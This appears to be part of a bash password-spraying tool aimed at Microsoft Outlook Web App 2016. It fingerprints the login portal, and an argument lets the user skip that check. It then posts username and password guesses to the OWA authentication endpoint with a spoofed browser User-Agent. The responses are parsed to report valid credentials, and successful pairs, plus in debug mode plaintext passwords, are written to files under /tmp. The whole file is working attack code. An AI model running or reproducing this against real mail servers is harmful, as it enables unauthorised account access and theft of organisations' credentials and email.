#!/bin/bash

check_OWA2016(){
	check_Portal=$(wget --timeout=4 -qO- https://$1/owa/auth/logon.aspx --no-check-certificate);
	if ([ "$(echo $check_Portal | grep '2003-2006 Microsoft Corporation' )" ]) || [ $(echo "$5" | tr '[:upper:]' '[:lower:]' ) == "disable_check" ] || [ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "disable_check" ] || [ $(echo "$7" | tr '[:upper:]' '[:lower:]') == "disable_check" ] ; then
		:
	else
		echo "Either not an OWA portal, or not compatible version.";
		echo "Exiting...";
		exit 1;
	fi
}

POST_OWA2016(){
    POST=$(curl -i -s -k  -X $'POST' \
    -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0' -H $'Referer: https://'$1'/owa/auth/logon.aspx?replaceCurrent=1' -H $'Content-Type: application/x-www-form-urlencoded' \
    -b $'ClientId=NRJSAKKGZQBCOTXKYZ; PrivateComputer=true; PBack=0' \
    --data-binary $'destination=https%3A%2F%2F'$1'%2Fowa%2F&flags=4&forcedownlevel=0&username='$line'&password='$pass'&passwordText=&isUtf8=1' \
    $'https://'$1'/owa/auth.owa');
    #If Logging is enabled Single User
		if [[ $(echo "$5" | tr '[:upper:]' '[:lower:]') == "debug" ]] || [[ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "debug" ]] || [[ $(echo "$7" | tr '[:upper:]' '[:lower:]') == "debug" ]]; then
			echo "host:$1 username:$line password:$pass" >> /tmp/conformer.debug;
			echo "" >> /tmp/conformer.debug;			
			echo "$POST" >> /tmp/conformer.debug;
			echo "" >> /tmp/conformer.debug;	
			echo "" >> /tmp/conformer.debug;	
			echo "-------------------------------------------------------------" >> /tmp/conformer.debug;	
		fi
	#checks cookie to see if successful login
		if [[ $POST == *"Content-Type: text/html; charset=utf-8"* ]]; then
			echo "	$line:$pass:**Success**";
		# Logging
		if [[ $(echo "$5" | tr '[:upper:]' '[:lower:]') == "log" ]] || [[ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "log" ]] || [[ $(echo "$7" | tr '[:upper:]' '[:lower:]') == "log" ]]; then
			echo "	$line:$pass:**Success**" >> /tmp/conformer.log;
		fi
		elif [[ $POST != *"<title>Object moved</title>"* ]] && [[ $POST != *"Content-Type: text/html; charset=utf-8"* ]]; then
			echo "	$line:$pass:Fail --- Page not responding properly.";
		# Logging
		if [[ $(echo "$5" | tr '[:upper:]' '[:lower:]') == "log" ]] || [[ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "log" ]] || [[ $(echo "$7" | tr '[:upper:]' '[:lower:]') == "log" ]]; then
			echo "	$line:$pass:Fail --- Page not responding properly." >> /tmp/conformer.log;
		fi
		else #Set-Cookie: NSC_VPNERR=4001 (failed cookie) (if need to be explict later)
			echo "	$line:$pass:Fail";
		if [[ $(echo "$5" | tr '[:upper:]' '[:lower:]') == "log" ]] || [[ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "log" ]] || [[ $(echo "$7" | tr '[:upper:]' '[:lower:]') == "log" ]]; then
			echo "	$line:$pass:Fail" >> /tmp/conformer.log;
		fi
		fi
}
